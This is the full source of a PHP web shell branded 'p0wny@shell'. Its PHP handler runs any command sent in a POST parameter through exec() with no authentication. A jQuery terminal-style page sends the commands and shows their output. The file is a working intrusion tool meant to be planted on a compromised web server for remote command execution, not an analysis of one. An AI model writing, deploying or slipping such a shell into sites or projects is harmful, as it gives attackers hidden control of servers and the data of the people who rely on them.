<?php

function featureShell($cmd, $cwd) {
    $stdout = array();

    if (preg_match("/^\s*cd\s*$/", $cmd)) {
        // pass
    } elseif (preg_match("/^\s*cd\s+(.+)\s*$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+(.+)\s*$/", $cmd, $match);
        chdir($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }

    return array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    );
}

function featurePwd() {
    return array("cwd" => getcwd());
}

if (isset($_GET["feature"])) {

    $response = NULL;

    switch ($_GET["feature"]) {
        case "shell":
            $response = featureShell($_POST["cmd"], $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}

?><!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title>p0wny@shell:~#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
            }

            #shell {
                background: #222;
                max-width: 800px;
                margin: 50px auto 0 auto;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
            }

            #shell-content {
                height: 500px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
            }

            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .shell-prompt > span {
                color: #1BC9E7;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input > input {
                flex-grow: 1;
                height: 30px;
                line-height: 30px;
                padding: 0 5px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
            }
        </style>

        <script src="https://code.jquery.com/jquery-3.1.1.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>

        <script>
            var CWD = null;

            function featureShell(command) {
                var eShellContent = document.getElementById("shell-content");

                function _insertCommand(command) {
                    eShellContent.innerHTML += "\n\n";
                    eShellContent.innerHTML += `<span class=\"shell-prompt\">${genPrompt(CWD)}</span> `;
                    eShellContent.innerHTML += escapeHtml(command);
                    eShellContent.innerHTML += "\n";
                    eShellContent.scrollTop = eShellContent.scrollHeight;
                }

                function _insertStdout(stdout) {
                    eShellContent.innerHTML += escapeHtml(stdout);
                    eShellContent.scrollTop = eShellContent.scrollHeight;
                }

                _insertCommand(command);
                return $.post("?feature=shell", {cmd: command, cwd: CWD}, "json")
                    .then(response => _insertStdout(response.stdout.join("\n")) || response)
                    .then(response => updateCwd(response.cwd) || response)
                    .fail(error => _insertStdout("AJAX ERROR: " + JSON.stringify(error)));
            }

            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = `…/${splittedCwd[splittedCwd.length-2]}/${splittedCwd[splittedCwd.length-1]}`;
                }
                return `p0wny@shell:<span title="${cwd}">${shortCwd}</span>#`
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                return $.post("?feature=pwd", {}, "json")
                    .then(response => CWD = (response.cwd) || response)
                    .then(response => _updatePrompt() || response)
                    .fail(error => console.error(error));

            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }

            function _onShellCmdKeyDown(event) {
                var eShellCmdInput = document.getElementById("shell-cmd");
                if (event.key == "Enter") {
                    featureShell(eShellCmdInput.value);
                    eShellCmdInput.value = "";
                }
            }

            window.onload = function() {
                updateCwd();
            };
        </script>
    </head>

    <body>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">
        ___                         ____      _          _ _        _  _   <span></span>
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ <span></span>
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|<span></span>
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|<span></span>
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  <span></span>
|_|                         |___/  \____/                                  <span></span>
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
            </div>
        </div>
    </body>

</html>
